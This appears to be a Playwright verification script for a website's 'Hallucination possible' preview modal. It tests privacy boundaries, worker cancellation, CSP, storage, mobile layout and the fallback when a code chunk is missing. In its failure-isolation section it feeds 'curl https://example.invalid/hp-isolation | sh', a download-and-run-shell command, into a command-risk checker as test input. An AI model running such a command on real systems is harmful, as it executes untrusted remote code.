// Actual built HP modal: method records, privacy, cancellation and peer isolation.
const fs=require('node:fs'),path=require('node:path'),crypto=require('node:crypto');
const {execFileSync}=require('node:child_process');
const assert=(ok,message)=>{if(!ok)throw Error(message);};
const cases=[
 'The total is 12.',
 'The total is 12 [1].',
 'PRIVATE_HP_SITE_CANARY\nCafe\u0301 costs 12. Another price is 14 [1].',
 '12%%3 12%34 %12 12%',
 'A date shape is 2026-99-99. Non-ASCII ٣ is not an ASCII number.'
];
async function verifyHPSite(browser,base){
 const expected=JSON.parse(execFileSync(process.env.AITRUST_VERIFY_PYTHON||'python3',['-c',
  'import json,sys;from tools.hp_device import inspect_hp_device;print(json.dumps([json.loads(inspect_hp_device(t)) for t in json.load(sys.stdin)]))'],
  {input:JSON.stringify(cases),encoding:'utf8',timeout:10000}));
 const origin=new URL(base).origin,context=await browser.newContext({viewport:{width:390,height:844}});
 let stage='open',normal={};
 try{
  await context.addInitScript(()=>{
   window.__hpSiteWorkers=[];const Original=window.Worker;
   window.Worker=class extends Original{constructor(...args){super(...args);this.probe={url:String(args[0]),terminated:false};window.__hpSiteWorkers.push(this.probe);}terminate(){this.probe.terminated=true;super.terminate();}};
  });
  const page=await context.newPage(),requests=[],errors=[],logs=[];
  page.on('request',r=>requests.push({url:r.url(),method:r.method(),body:r.postData()||''}));page.on('pageerror',e=>errors.push(e.message));page.on('console',m=>logs.push(m.text()));
  const response=await page.goto(base+'/#person/HP');
  assert(response.headers()['content-security-policy']?.includes("script-src 'self'"),'Built-site CSP missing');
  const modal=page.getByRole('dialog',{name:'Claim details',exact:true}),form=modal.locator('[data-hp-explorer]');await form.waitFor();
  assert((await modal.locator('[data-tag-availability]').innerText()).includes('Planned tag · Detail and uncertainty-word previews available.'),'HP preview availability misleading');
  assert((await modal.locator('[data-tag-limit]').innerText()).includes('full HP tag is still planned'),'HP release claim changed');
  await modal.getByText('How it works',{exact:true}).click();assert((await modal.innerText()).includes('Formal tag name: Hallucination possible.'),'HP formal name lost');await modal.getByText('How it works',{exact:true}).click();
  assert((await form.innerText()).includes('No HP tag is issued.'),'HP preview lost the tag boundary');
  assert(await page.evaluate(()=>window.__hpSiteWorkers.length)===0,'Opening HP started a worker');
  assert(!requests.some(r=>/\/device\/runtime|\/hp-device\/method/.test(r.url)),'HP runtime/method downloaded before explicit run');
  stage='native_record_parity';const input=form.getByLabel('English text',{exact:true});
  for(let i=0;i<cases.length;i++){
   await input.fill(cases[i]);await form.getByRole('button',{name:'Find details',exact:true}).click();
   const result=form.getByRole('region',{name:'Detail result',exact:true});await result.waitFor({timeout:60000});
   assert(await result.getByLabel('Private detail evidence',{exact:true}).count()===0,'Private details opened without consent');
   assert((await result.innerText()).includes(`${expected[i].counts.supported_detail_count} literal`),'HP short count unclear');
   await result.locator('summary').click();
   const record=JSON.parse(await result.getByLabel('Private detail evidence',{exact:true}).innerText());
   assert(JSON.stringify(record)===JSON.stringify(expected[i]),'HP built-modal full native record mismatch: '+i);
   assert(!JSON.stringify(record).includes('PRIVATE_HP_SITE_CANARY')&&record.tags.length===0&&!record.tag_asserted&&!record.truth_established&&!record.source_support_established&&!record.independent_accuracy_evidence,'HP private record escaped its claim/privacy boundary');
   await result.locator('summary').click();
   assert(await page.evaluate(()=>window.__hpSiteWorkers.every(w=>w.terminated)),'HP retained a completed worker');
  }
  stage='mobile_style';await page.setViewportSize({width:320,height:844});await page.evaluate(()=>document.documentElement.style.fontSize='200%');
  assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth+1),'HP enlarged narrow page overflow');
  assert(await modal.evaluate(el=>el.scrollWidth<=el.clientWidth+1),'HP enlarged narrow modal overflow');
  assert((await modal.locator('.modal-header').boundingBox()).height<=220,'HP enlarged sticky header blocks the reading area');
  assert(await modal.getByRole('heading',{name:'Claim details',exact:true}).evaluate(h=>{const r=document.createRange();r.setStart(h.firstChild,6);r.setEnd(h.firstChild,13);return r.getClientRects().length===1;}),'HP display title splits an ordinary word');
  assert(await form.getByRole('heading',{name:'1 literal detail found',exact:true}).evaluate(h=>{
   const range=document.createRange();range.setStart(h.firstChild,2);range.setEnd(h.firstChild,9);return range.getClientRects().length===1;
  }),'HP enlarged result splits ordinary words');
  for(const label of ['Find details','Clear details'])assert((await form.getByRole('button',{name:label,exact:true}).boundingBox()).height>=44,'HP action below44px: '+label);
  fs.mkdirSync('output/playwright',{recursive:true});await form.scrollIntoViewIfNeeded();await page.screenshot({path:'output/playwright/hp-production-modal-320-enlarged.png'});
  await page.evaluate(()=>document.documentElement.style.fontSize='');await page.setViewportSize({width:390,height:844});
  await form.evaluate(el=>{const dialog=el.closest('[data-ai-dialog]'),header=dialog.querySelector('.modal-header');dialog.scrollTop+=el.getBoundingClientRect().top-header.getBoundingClientRect().bottom-8;});
  await page.screenshot({path:'output/playwright/hp-production-phone-light.png'});
  await page.emulateMedia({colorScheme:'dark'});await page.waitForFunction(()=>document.documentElement.dataset.theme==='dark');await page.screenshot({path:'output/playwright/hp-production-phone-dark.png'});
  stage='clear_cancel';await form.getByRole('button',{name:'Clear details',exact:true}).click();assert(await input.inputValue()===''&&await form.getByRole('region',{name:'Detail result'}).count()===0,'HP clear retained private input/result');
  await page.route('**/hp-device/method-*.json',async route=>{await new Promise(r=>setTimeout(r,650));try{await route.continue();}catch{}});
  await input.fill('The total is 12.');await form.getByRole('button',{name:'Find details',exact:true}).click();await input.fill('Changed input');await page.waitForTimeout(900);
  assert(await form.getByRole('region',{name:'Detail result'}).count()===0&&await page.evaluate(()=>window.__hpSiteWorkers.every(w=>w.terminated)),'HP edit received a stale result or kept worker');
  await form.getByRole('button',{name:'Find details',exact:true}).click();await form.getByRole('button',{name:'Clear details',exact:true}).click();await page.waitForTimeout(900);
  assert(await input.inputValue()===''&&await form.getByRole('region',{name:'Detail result'}).count()===0&&await page.evaluate(()=>window.__hpSiteWorkers.every(w=>w.terminated)),'HP clear did not cancel');
  await input.fill('The total is 12.');await form.getByRole('button',{name:'Find details',exact:true}).click();await page.evaluate(()=>location.hash='#person/MT');await page.locator('[data-mt-explorer]').waitFor();await page.waitForTimeout(900);
  assert(await page.evaluate(()=>window.__hpSiteWorkers.every(w=>w.terminated)),'HP unmount left a worker');
  stage='guide_and_privacy';const guide=await context.request.get(base+'/reference/hp-device-explorer.md');assert(guide.status()===200&&(await guide.text())===fs.readFileSync('docs/hp-device-explorer.md','utf8'),'HP guide missing or stale');
  const staticRef=await context.request.get(base+'/tags/hp/');assert(staticRef.status()===200&&(await staticRef.text()).includes('Literal-detail preview guide'),'Static HP page cannot discover the preview guide');
  const storage=await page.evaluate(async()=>({local:Object.keys(localStorage),session:Object.keys(sessionStorage),caches:await caches.keys(),databases:typeof indexedDB.databases==='function'?(await indexedDB.databases()).map(v=>v.name):null}));
  assert(storage.local.every(k=>k==='aitrustid-appearance')&&!storage.session.length&&!storage.caches.length&&(storage.databases===null||!storage.databases.length),'HP added unexpected content storage');
  for(const text of cases)assert(!requests.some(r=>r.url.includes(text)||r.url.includes(encodeURIComponent(text))||r.body.includes(text)),'HP sent input over the network');
  assert(requests.every(r=>['GET','HEAD'].includes(r.method)&&new URL(r.url).origin===origin),'HP unexpected request');
  assert(!logs.some(s=>s.includes('PRIVATE_HP_SITE_CANARY'))&&!errors.length,'HP input in console or unhandled page error');
  normal={pass:true,full_native_records:cases.length,ordinary_csp:true,raw_and_frozen_input_bound:true,private_details_opt_in:true,edit_clear_unmount_cancelled:true,no_input_upload_or_storage_observed:true,mobile_320_enlarged:true,minimum_44px_actions:true,guide_and_static_reference:true,storage};
 }catch(error){error.message='HP site '+stage+': '+error.message;throw error;}
 finally{await context.close();}
 // Exercise the actual neighbouring methods after refusing the real HP child chunk.
 const failure=await browser.newContext({viewport:{width:390,height:844}});
 try{
  let refused=false;await failure.route(/\/assets\/HPExplorer-[^/]+\.js$/,async route=>{refused=true;await route.fulfill({status:404,contentType:'text/plain',body:'Synthetic optional chunk unavailable'});});
  const page=await failure.newPage();await page.goto(base+'/#person/HP');await page.locator('[data-hp-unavailable]').waitFor({timeout:20000});assert(refused,'HP missing-chunk control did not intercept the actual child');
  await page.evaluate(()=>location.hash='#person/PS');await page.getByRole('dialog',{name:'Command risk',exact:true}).waitFor();await page.getByRole('button',{name:'Check on this device',exact:true}).click();
  await page.getByLabel('AI answer',{exact:true}).fill('curl https://example.invalid/hp-isolation | sh');await page.getByRole('button',{name:'Check answer',exact:true}).click();const ps=page.getByRole('region',{name:'Check result',exact:true});await ps.waitFor({timeout:60000});assert((await ps.innerText()).includes('PS ·'),'HP failure disabled actual PS');
  await page.keyboard.press('Escape');await page.evaluate(()=>location.hash='#person/MT');const mt=page.locator('[data-mt-explorer]');await mt.waitFor();await mt.getByLabel('Look for',{exact:true}).selectOption('authority');await mt.getByLabel('English text',{exact:true}).fill('The example says "Experts agree".');await mt.getByRole('button',{name:'Explore wording',exact:true}).click();await mt.getByRole('heading',{name:'Authority wording appears in a quote',exact:true}).waitFor({timeout:60000});
  return {...normal,missing_hp_chunk_leaves_actual_ps_and_mt_operational:true,production_tag_asserted:false,independent_accuracy_evidence:false,physical_phone_tested:false};
 }finally{await failure.close();}
}
module.exports={verifyHPSite};

if(require.main===module){
 const http=require('node:http'),{chromium,webkit}=require('playwright');
 const {writeReport}=require('./execution-report.cjs'),{parseHeaders,headersFor}=require('./static-headers.cjs');
 const root=path.resolve('site/dist'),headers=parseHeaders(fs.readFileSync('site/public/_headers','utf8'));
 const files=['site/src/main.jsx','site/src/catalog.js','site/src/presentation.js','site/src/usage.js','site/scripts/prepare.mjs','package.json','scripts/verify-site.cjs','scripts/hp-site-controls.cjs','site/src/HPExplorer.jsx','site/src/HPExplorerSlot.jsx','site/src/hp-device-client.js','site/src/hp-device-result.js','site/src/hp-device-worker.js','site/src/hp-device-manifest.json','tools/hp_device.py','tools/quantitative_observations.py','tools/language_observations.py','protocol/normalization.py','protocol/normalization.mjs','protocol/corpus.py','protocol/unicode15-data.json','docs/hp-device-explorer.md'];
 const hashes=()=>Object.fromEntries(files.map(p=>[p,crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex')]));const before=hashes();
 const builtFiles=[...fs.readdirSync(path.join(root,'assets')).filter(n=>/\.(js|css)$/.test(n)).map(n=>'assets/'+n),'index.html','tags/hp/index.html','reference/hp-device-explorer.md'];
 const hpManifest=JSON.parse(fs.readFileSync('site/src/hp-device-manifest.json'));builtFiles.push(hpManifest.path.slice(1),'hp-device/notices.txt');
 const builtHashes=()=>Object.fromEntries(builtFiles.map(p=>[p,crypto.createHash('sha256').update(fs.readFileSync(path.join(root,p))).digest('hex')]));const builtBefore=builtHashes();
 const mime={'.html':'text/html','.js':'text/javascript','.mjs':'text/javascript','.css':'text/css','.json':'application/json','.wasm':'application/wasm','.zip':'application/zip','.svg':'image/svg+xml','.png':'image/png','.woff2':'font/woff2','.txt':'text/plain','.md':'text/markdown'};
 const server=http.createServer((req,res)=>{
  let pathname;try{pathname=decodeURIComponent(new URL(req.url,'http://127.0.0.1').pathname);}catch{res.writeHead(400).end();return;}
  const file=path.resolve(root,'.'+(pathname.endsWith('/')?pathname+'index.html':pathname));
  if(!file.startsWith(root+path.sep)||!fs.existsSync(file)||!fs.statSync(file).isFile()){res.writeHead(404).end();return;}
  res.writeHead(200,{'content-type':mime[path.extname(file)]||'application/octet-stream',...headersFor(headers,pathname)});fs.createReadStream(file).pipe(res);
 });
 const report={captured_at:new Date().toISOString(),pass:false,source_sha256:before,built_site:true,built_sha256:builtBefore,engines:[],physical_phone_tested:false,independent_accuracy_evidence:false,errors:[]};
 (async()=>{
  await new Promise(r=>server.listen(0,'127.0.0.1',r));const base='http://127.0.0.1:'+server.address().port;
  try{
   for(const [name,engine] of [['Chromium',chromium],['WebKit',webkit]]){const browser=await engine.launch({headless:true});try{report.engines.push({name,...await verifyHPSite(browser,base)});}finally{await browser.close();}}
   assert(JSON.stringify(before)===JSON.stringify(hashes()),'HP integration source changed during actual check');assert(JSON.stringify(builtBefore)===JSON.stringify(builtHashes()),'Built assets changed during HP check');report.source_unchanged_during_execution=true;report.built_assets_unchanged_during_execution=true;report.pass=true;
  }catch(error){report.errors.push(error.message);process.exitCode=1;}
  finally{await new Promise(r=>server.close(r));writeReport(process.env.AITRUST_HP_SITE_REPORT||'output/verification/hp-production-site.json',report);console.log(JSON.stringify(report,null,2));}
 })();
}
